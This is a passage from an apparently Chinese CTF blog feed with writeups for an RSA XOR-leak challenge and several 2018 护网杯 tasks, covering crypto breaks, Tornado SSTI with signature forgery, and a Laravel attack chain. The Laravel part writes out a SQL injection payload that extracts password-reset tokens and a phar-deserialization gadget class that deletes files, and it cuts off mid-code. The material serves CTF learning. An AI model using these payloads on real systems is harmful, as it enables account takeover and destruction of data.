class="number">1023</span>, <span class="number">2</span> ** <span class="number">1024</span>)</span><br><span class="line">q = sympy.randprime(<span class="number">2</span> ** <span class="number">1023</span>, <span class="number">2</span> ** <span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">a = (p * q) ^ (p + q)</span><br><span class="line">b = (p * q) ^ (p - q)</span><br><span class="line"></span><br><span class="line">flag = open(<span class="string">'flag.txt'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">m = int.from_bytes(flag, <span class="string">'big'</span>)</span><br><span class="line"></span><br><span class="line">print(a, b, pow(m, <span class="number">65537</span>, p * q))</span><br></pre></td></tr></table></figure><p>题目只提供了 p 和 q 以及密文，p 和 q 都是 1024bit，我们要根据 a 和 b 来求私钥。因为给的都是异或运算的结果，难以通过数学变换得到。</p><p>这里用到的是逐比特猜解的思想，从低位向高位猜解。对于 a 和 b 的最低 n 个 bit 位，只和 p 和 q 的最低 n 个位有关。我们可以用 a 和 b 的最低位来验证 p 和 q 是否满足要求。</p><p>对于每位，p 和 q 就四种可能：<code>(0,0) (0,1) (1,0) (1,1)</code> 我们从最后第一位开始尝试，满足要求的组合放入候选列表里，对于候选列表的每项，验证高一位时又会分出四种情况，同样进行验证，更新候选列表，把符合要求的放入列表里，以此类推。最后找到满足 a 和 b 所有 bit 位的 p 和 q。</p><p>可以看一下 wiki 的相关资料：<br><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/lcg/challenge/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/lcg/challenge/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">a=<span class="number">20177650286553319048656572431426864683972322616537528728644836950907654167144961938429509778926505938147163259147328872178897507791522569632637628576826135964471897661414351261453774090509205324220367785291196302551202990322952833839519685942136552490589504983264090018782888509594899124308485994909369157739590678421913334422763356613026472743079024933233557565198057398238454462971661266735075199307328588913060033329742394868127944469289321187036511972057975816136466581904044150309083660596527476198646767207896234322280486096803109351478982849399252765905154625449629131202246956928879278104313464399748896654335</span></span><br><span class="line">b=<span class="number">-20177650286553319048656572431426864683972322616537528728644836950907654167144961938429509778926505938147163259147328872178897507791522569632637628576826135964471897661414351261453774090509205324220367785291196302551202990322952833839519685942136552490589504983264090018782888509594899124308485994909369157739690798236942786515359420891819523078078001184938002588184640997371794236705658312351156161124668283889171041058024858239408724965303885485356611059740480075879221661858319606783376958758348179998879989787088907672913468336293174408246405953882533580841784122100084676690051777413318254860735992696612183461891</span></span><br><span class="line">c=<span class="number">13366903717795173429187761381567634048063984815133198408928503123602872647318097072713914639532980123537673828080136443096769208675278048903846468093331645356496756288494505939828792144555809683756644579691988377803769792505153509199204570978899052097185497377390921828391436597604626534413078392906362225675998274015504081511064143613477551873256333146732640157434336327576006467405800870704016822007754775192350360613102361780884075519253676949699170275909029570177548059093617965631063061181238396995096224186949430603966487712969428525308725462401758888441403291459307185920723957045088801754933390532219059494721</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f1 = <span class="keyword">lambda</span> p, q: (p * q) ^ (p + q)</span><br><span class="line">f2 = <span class="keyword">lambda</span> p, q: (p * q) ^ (p - q)</span><br><span class="line"></span><br><span class="line">candidates = &#123;(<span class="number">0</span>, <span class="number">0</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1025</span>):</span><br><span class="line">    print(m, len(candidates))</span><br><span class="line">    candidates_ = set()</span><br><span class="line">    mask = (<span class="number">2</span> &lt;&lt; m) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x, y <span class="keyword">in</span> candidates:</span><br><span class="line">        <span class="keyword">for</span> bx <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">for</span> by <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                xx = x + (bx &lt;&lt; m)</span><br><span class="line">                yy = y + (by &lt;&lt; m)</span><br><span class="line">                <span class="keyword">if</span> f1(xx, yy) &amp; mask != a &amp; mask:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> f2(xx, yy) &amp; mask != b &amp; mask:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                candidates_.add((xx, yy))</span><br><span class="line">    candidates = candidates_</span><br><span class="line"><span class="keyword">for</span> x, y <span class="keyword">in</span> candidates:</span><br><span class="line">    <span class="keyword">if</span> f1(x, y) == a <span class="keyword">and</span> f2(x, y) == b:</span><br><span class="line">        p, q = x, y</span><br><span class="line">        d = gmpy2.invert(<span class="number">65537</span>, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">        m = pow(c, d, p * q)</span><br><span class="line">        print(libnum.n2s(m))</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><blockquote><p>flag{Z_loves_RSA_and_maths~!:)}</p></blockquote><p>参考： <code>https://github.com/ustclug/hackergame2018-writeups/blob/master/official/RSA_of_Z/README.md</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 护网杯 wp</title>
      <link href="/2018/10/15/2018huwangbei/"/>
      <url>/2018/10/15/2018huwangbei/</url>
      
        <content type="html"><![CDATA[<p>再一次观看了一波神仙打架。</p><a id="more"></a><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="迟来的签到题"><a href="#迟来的签到题" class="headerlink" title="迟来的签到题"></a>迟来的签到题</h4><p>题目提示 easy xor,打开附件是一串 base64:</p><blockquote><p>AAoHAR1QUiBTJVBQI1RVIl5WJVInUlNWIFZUX1ZRJ1dWU1dfURs=</p></blockquote><p>解码是乱码。<br>猜想思路和 CSAW 密码第一题一模一样，写出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">ciphertext=<span class="string">"AAoHAR1QUiBTJVBQI1RVIl5WJVInUlNWIFZUX1ZRJ1dWU1dfURs="</span></span><br><span class="line">cipher=base64.b64decode(ciphertext)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    result=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> cipher:</span><br><span class="line">        result+=chr(ord(s)^i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">print</span> result</span><br></pre></td></tr></table></figure><blockquote><p>flag{64F5C66E23D80C4A450F02907A105197}</p></blockquote><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="fez"><a href="#fez" class="headerlink" title="fez"></a>fez</h4><p>题目源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x,k)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> xor(xor(x,k),<span class="number">7</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round</span><span class="params">(M,K)</span>:</span></span><br><span class="line">    L=M[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">    R=M[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">    new_l=R</span><br><span class="line">    new_r=xor(xor(R,L),K)</span><br><span class="line">    <span class="keyword">return</span> new_l+new_r</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fez</span><span class="params">(m,K)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> K:</span><br><span class="line">        m=round(m,i)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">K=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    K.append(os.urandom(<span class="number">27</span>))</span><br><span class="line">m=open(<span class="string">"flag"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line"><span class="keyword">assert</span> len(m)&lt;<span class="number">54</span></span><br><span class="line">m+=os.urandom(<span class="number">54</span>-len(m))</span><br><span class="line"></span><br><span class="line">test=os.urandom(<span class="number">54</span>)</span><br><span class="line"><span class="keyword">print</span> test.encode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">print</span> fez(test,K).encode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">print</span> fez(m,K).encode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure><p>给出了三组 print 的结果，分析加密过程是 feistel 密码结构，迭代了七轮，全部为异或，即给定明文 L+R(明文分成两部分)，最后加密的结果是：</p><blockquote><p>L_enc: R xor K1<br>R_enc: L xor R xor K2</p></blockquote><p>题目给出了 test 和 test 加密的结果，可以计算出 K1 和 K2，然后利用 flag 密文左半部分算出 flag明文的右半部分，进而得到 flag。</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">test=<span class="string">"2315d80c2dd73098953686be6c82aa63c1d362eb0095e4621cce28bec4c921ce016afc7f39fd93b14b6c28ce69c7096b91fd2db0862d"</span></span><br><span class="line">test_enc=<span class="string">"308e590a180473ab4d23a0c67b65fe2bf2d0a9f1b255e4e2610b0c90e8e210c8ed4f2b9a3b09c1886a781f94fee4f77488c0b30f2395"</span></span><br><span class="line">flag_enc=<span class="string">"e822e918e578a7af4f0859a99aab5d7563644beb4207a73d5fc4560d3deb696320cec479431a4f724310499baf5230db7e56764915d0"</span></span><br><span class="line">test=test.decode(<span class="string">"hex"</span>)</span><br><span class="line">test_enc=test_enc.decode(<span class="string">"hex"</span>)</span><br><span class="line">flag_enc=flag_enc.decode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">k1=xor(test[<span class="number">27</span>:<span class="number">54</span>],test_enc[<span class="number">0</span>:<span class="number">27</span>])</span><br><span class="line">k2=xor(xor(test[<span class="number">27</span>:<span class="number">54</span>],test[<span class="number">0</span>:<span class="number">27</span>]),test_enc[<span class="number">27</span>:<span class="number">54</span>])</span><br><span class="line">flag_r=xor(k1,flag_enc[<span class="number">0</span>:<span class="number">27</span>])</span><br><span class="line">flag_l=xor(flag_r,xor(k2,flag_enc[<span class="number">27</span>:<span class="number">54</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag_l+flag_r</span><br></pre></td></tr></table></figure><blockquote><p>flag{festel_weak_666_11xd77fhy33}</p></blockquote><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h4><p>题目打开有三个选项：</p><blockquote><p>Orz.txt 进去提示是 <strong>render()</strong><br>hint.txt 进去提示是 <strong>md5(cookie_secret + md5(filename))</strong><br>flag.txt 进去提示是 <strong>/fllllllllllag</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url 格式： http://117.78.26.200:31031/file?filename=hint.txt&amp;signature=74dfcb55b94ddbe4daedd3f21a68a2f</span><br></pre></td></tr></table></figure><p>那么应该就是读 /fllllllllllag 了，但是这里的 cookie_secret 不知道。<br>有一个提示是 render()，所以应该存在 SSTI，尝试用<strong>/error?msg=1</strong>，发现可以。但是过滤了相当多的字符，无法直接读到 cookie_secret 这个变量。</p><p>尝试了一波绕过姿势，无果。应该是利用 tornado 框架别的方式读取 cookie_secret。</p><p>在<a href="https://tornado-zh.readthedocs.io/zh/latest/web.html" target="_blank" rel="noopener">这篇文章</a>中发现 cookie_secret 存于handler 的 settings 中，所以构造 payload: <a href="http://117.78.26.200:31031/error?msg=" target="_blank" rel="noopener">http://117.78.26.200:31031/error?msg=</a>，得到 cookie_secret:</p><blockquote><p>‘cookie_secret’: g!E#Ax&amp;_ywJ[d1BRWe5U?qa^@u4pIh&lt;M$sTr0VL2t*3CKzv7mb]S-c8&gt;X)G.lYDQ</p></blockquote><p>有了 cookie_secret,filename 设成 /fllllllllllag，利用那个嵌套 md5 生成签名去访问，payload:<code>http://117.78.26.200:31031/file?filename=/fllllllllllag&amp;signature=a0e8913e76b38d61f13cb22ba8d59cf5</code></p><p>得到 flag：</p><blockquote><p>flag{975596d6031dd373b313acc910a6891f}</p></blockquote><h4 id="ltshop"><a href="#ltshop" class="headerlink" title="ltshop"></a>ltshop</h4><p>结束后听师傅们说是条件竞争和 mysql 的整数溢出，等一波 docker 复现….</p><h4 id="easy-laravel"><a href="#easy-laravel" class="headerlink" title="easy_laravel"></a>easy_laravel</h4><p>跟着师傅们的 wp 复现了一波，emmmmmm 不得不说这个题起名 easy_laravel，可以给出题人寄刀片了。现在 web一个题一个框架，打不动打不动…</p><blockquote><p>github 上的 docker 地址：<code>https://github.com/sco4x0/huwangbei2018_easy_laravel</code></p></blockquote><p>网页源代码给了源码地址： <code>https://github.com/qqqqqqvq/easy_laravel</code>.</p><p>注册一下，进去发现只有一个 note，还是空的：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a5f3d9062acfbde9.png" alt="image.png"></p><p>看一波源码：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-53b80b300e5a3adf.png" alt="image.png"></p><p>找到了管理员的名字和邮箱，但是密码是随机 40 位，破解是不可能了。</p><p>看一下路由，发现只有 note 功能是非管理员可以访问：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-58450c3f94781c85.png" alt="image.png"></p><p>那么我们首先要管理员身份登进去。</p><p>看一下 note 控制器 <strong>NoteController</strong>，发现存在注入：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-78ac55922401c9d9.png" alt="image.png"></p><p>所以构造 <strong>admin’or 1#</strong> 注册，登进去：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-71bf980bbd6b3a8f.png" alt="image.png"></p><p>再看看密码：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-c9142c44b45cc805.png" alt="image.png"></p><p>但是无法破解出原密码是什么…</p><p>我们看到了重置密码的代码：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-1168a4b6c26e0ba4.png" alt="image.png"></p><p>关于 laravel 框架重置密码，可以看一下文档：<br><a href="https://laravel-china.org/docs/laravel/5.6/passwords/1384" target="_blank" rel="noopener">https://laravel-china.org/docs/laravel/5.6/passwords/1384</a></p><p>大体流程是点击重置密码，输入管理员邮箱，就会生成一个管理员账号的 token ，输入 email 和对应的 token ，就可以访问 /password/reset/token 重置密码，token 怎么得知呢？</p><p>我们看到 email 和 token 都存入了数据库里，而我们有注入点，数据库所有信息都可以拿到。</p><p>首先我们点击重置密码，输入管理员邮箱。再去数据库里拿 token：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-984eda8a212bc86e.png" alt="image.png"></p><p>payload:<br><code>admin&#39;union select 1,(select token from password_resets where email=&#39;admin@qvq.im&#39;),3,4,5#</code><br>去访问：<br><code>http://192.168.146.145:2333/password/reset/8eea41c7ef5cdf968941d07b321722a70c8bc89086d0149979e7ec91d5c07870</code></p><p>重置密码：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-424e6d563fbb7522.png" alt="image.png"></p><p>成功登入管理员：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-d897e1c5d8acc362.png" alt="image.png"></p><p>flag 部分显示 no flag。<br>我们看一下 flag 部分的控制器，发现明明显示了 flag：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-b7f474853b7ffbe5.png" alt="image.png"></p><p>这里的考点是 Blade 模板缓存，旧缓存没有删除，我们无法看到 flag，参考<a href="https://www.jianshu.com/p/7d65f9eb94be" target="_blank" rel="noopener">这篇</a></p><p>所以我们要做的就是删除缓存文件，读到 flag，首先要找到缓存文件。</p><p>缓存文件的名字是laravel自动生成的，生成方法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCompiledPath</span><span class="params">($path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cachePath.<span class="string">'/'</span>.sha1($path).<span class="string">'.php'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 $path 就是模板的位置，是** /usr/share/nginx/html/resources/views/auth/flag.blade.php **</p><p>nginx 的默认网站根目录是 /usr/share/nginx/html，而从<a href="https://www.jianshu.com/p/018c83d6b38c" target="_blank" rel="noopener">这篇博客</a>得知缓存文件放在 /storage/framework/views，加上 sha1 算法，所以最后路径是：</p><blockquote><p>/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php</p></blockquote><p>有了路径，怎么去删除呢？</p><p>利用 composer 的各种依赖，参考<a href="https://pigjian.com/article/composer-laravel-package-of-local-development" target="_blank" rel="noopener">这篇</a> 安装组件。(可以利用 贴出的 docker 地址里的 composer.phar，也可以添加环境变量用 composer install 安装)</p><p>看一下<strong>composer</strong>,搜索 unlike ，发现了在<strong>Swift_ByteStream_TemporaryFileByteStream</strong>的析构函数有 unlike，那应该是通过反序列化漏洞来执行析构函数删除缓存，在哪里触发反序列化呢？</p><p>我们在 check 这里发现了 file_exists：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $path = $request-&gt;input(<span class="string">'path'</span>, <span class="keyword">$this</span>-&gt;path);</span><br><span class="line">    $filename = $request-&gt;input(<span class="string">'filename'</span>, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">if</span>($filename)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($path . $filename))&#123;</span><br><span class="line">            Flash::error(<span class="string">'磁盘文件已删除，刷新文件列表'</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            Flash::success(<span class="string">'文件有效'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> redirect(route(<span class="string">'files'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用到了 phar:// 反序列的方法，可以参考<a href="https://xz.aliyun.com/t/2715" target="_blank" rel="noopener">这篇文章</a></p><p>这样我们构造 phar 包，以下是构造的 php 代码：</p><p><strong>注意一下：</strong>需要将 php.ini 中的 phar.readonly 选项设置为off，否则无法生成 phar 文件(php.ini中修改是记得把前面的”;”去掉，我就是一只没去掉分号而一直修改不成功)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Write sequence.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $sequence = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * StreamFilters.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Swift_StreamFilter[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $filters = [];</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A buffer for writing.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $writeBuffer = <span class="string">''</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bound streams.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Swift_InputByteStream[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $mirrors = [];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_FileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line">    <span class="comment">/** The internal pointer offset */</span></span><br><span class="line">    <span class="keyword">private</span> $_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The path to the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_path;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The mode this file is opened in for writing */</span></span><br><span class="line">    <span class="keyword">private</span> $_mode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** A lazy-loaded resource handle for reading the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_reader;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** A lazy-loaded resource handle for writing the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_writer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** If magic_quotes_runtime is on, this will be true */</span></span><br><span class="line">    <span class="keyword">private</span> $_quotes = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** If stream is seekable true/false, or null if not known */</span></span><br><span class="line">    <span class="keyword">private</span> $_seekable = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new FileByteStream for $path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $path</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bool   $writable if true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path, $writable = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_path = $path;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_mode = $writable ? <span class="string">'w+b'</span> : <span class="string">'rb'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (function_exists(<span class="string">'get_magic_quotes_runtime'</span>) &amp;&amp; @get_magic_quotes_runtime() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_quotes = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the complete path to the file.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPath</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_path;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_TemporaryFileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_FileByteStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $filePath = <span class="string">"/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php"</span>;</span><br><span class="line">        <span class="keyword">parent</span>::__construct($filePath, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span 